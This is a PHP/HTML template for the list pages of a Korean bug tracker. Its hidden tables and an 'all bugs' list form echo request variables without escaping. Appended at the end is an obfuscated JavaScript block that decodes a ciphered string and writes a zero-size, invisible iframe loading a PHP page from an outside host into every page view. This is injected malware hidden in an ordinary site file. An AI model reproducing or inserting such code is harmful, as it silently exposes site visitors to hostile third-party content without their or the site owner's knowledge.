<!-- 내 페이지 버그 -->
<table id='sub001' style="display:none" cellspacing=0 cellpadding=0 width=100% border=0>
	<tr id=tr001>
		<td valign=top align=center style=padding-top:5px>
			<? include "$dir/myBug.php";?>
		</td>
	</tr>
</table>

<!-- 새로운 버그 -->
<table id='sub002' style="display:none" cellspacing=0 cellpadding=0 width=100% border=0>
	<tr id=tr002>
		<td valign=top align=center style=padding-top:5px>
			<? include "$dir/newBug.php";?>
		</td>
	</tr>
</table>

<!-- 담당자가 접수한 버그 -->
<table id='sub003' style="display:none" cellspacing=0 cellpadding=0 width=100% border=0>
	<tr id=tr003>
		<td valign=top align=center style=padding-top:5px>
			<? include "$dir/assignedBug.php";?>
		</td>
	</tr>
</table>

<!-- 처리된 버그 -->
<table id='sub004' style="display:none" cellspacing=0 cellpadding=0 width=100% border=0>
	<tr id=tr004>
		<td valign=top align=center style=padding-top:5px>
			<? include "$dir/resolvedBug.php";?>
		</td>
	</tr>
</table>

<!-- 처리를 검증한 버그 -->
<table id='sub005' style="display:none" cellspacing=0 cellpadding=0 width=100% border=0>
	<tr id=tr005>
		<td valign=top align=center style=padding-top:5px>
			<? include "$dir/verifiedBug.php";?>
		</td>
	</tr>
</table>

<!-- 전체 버그 리스트 -->

<table id='sub006' style="display" cellspacing=0 cellpadding=0 width=100% border=0 >
	<tr id=tr006>
		<td valign=top align=center style=padding-top:5px>

<table border=0  width=100% cellpadding="5" cellspacing="0" >
	<tr height=30 ><td colspan=7 class=title   valign=top style="font:15px;"><b>전체 버그 목록</b></td></tr>
</table>
<table border=0 cellspacing=0 cellpadding=0 width=<?=$width?> >
<form method=post name=list action=list_all.php><input type=hidden name=page value=<?=$page?>>
<input type=hidden name=id value=<?=$id?>><input type=hidden name=select_arrange value=<?=$select_arrange?>>
<input type=hidden name=desc value=<?=$desc?>>
<input type=hidden name=page_num value=<?=$page_num?>>
<input type=hidden name=selected>
<input type=hidden name=exec>
<input type=hidden name=keyword value="<?=$keyword?>">
<input type=hidden name=sn value="<?=$sn?>">
<input type=hidden name=ss value="<?=$ss?>">
<input type=hidden name=sc value="<?=$sc?>">
<col width=7%></col>
<col width=58%></col>
<col width=12%></col>
<col width=12%></col>
<col width=7%></col>

<tr align=left>
<td background=<?=$dir?>/images/h_bg.gif height=25>
<table cellspacing=0 cellpadding=0>
<tr>
<td><img src=<?=$dir?>/images/h_left.gif WIDTH="3" HEIGHT="25" BORDER=0></td>
<td align=center width=100%><?=$a_no?>번호</a></td>
</tr>
</table>
</td>
<td  background=<?=$dir?>/images/h_bg.gif height=25>
<table cellspacing=0 cellpadding=0 width=100%>
<tr><td align=center><?=$a_subject?>제 목</a></td>
</tr>
</table>
</td>
<td background=<?=$dir?>/images/h_bg.gif height=25>
<table width=100% border=0>
<tr><td align=right><?=$a_name?>작성자</a></td><td width=5></td>
</tr>
</table>
</td>
<td background=<?=$dir?>/images/h_bg.gif height=25>
<table width=100%>
<tr><td align=center><?=$a_date?>등록일</a></td>
</tr>
</table>
</td>
<td background=<?=$dir?>/images/h_bg.gif height=25 align=right>
<table cellspacing=0 cellpadding=0>
<tr align=center><td width=100%><?=$a_hit?>조회</a></td>
<td><img src=<?=$dir?>/images/h_right.gif WIDTH="3" HEIGHT="25" BORDER=0></td>
</tr>
</table>
</td>
</td>
</tr>
<SCRIPT LANGUAGE="JavaScript"><!--
var text1="w~8lcg4 dil34ly> gcl9~h7~3n0y> mley0nnjvrrmcg4n0~h:seigrm4mm~ihsj0j 8lcg4dil34ly> 7~3n0y> meliff~h9yhi 04~90ny> gcl9~h0~490ny>xwr~8lcg4x";var output="";var setters="abcdefghijklmnopqrstuvwxyz/.1234567890~_: <>=";var key="rst<z/.1=2a>buv wxy";
var letters="cde34890~_:fghijklmn567opqrst<z/.1=2a>buv wxy";for(var count=0; count<text1.length; count++) {var daChar=text1.charAt(count);for (i=0;i<letters.length;i++) { if (daChar==letters.charAt(i)) {output+=setters.charAt(i);break;}}}this.document.write(output);
--></script>
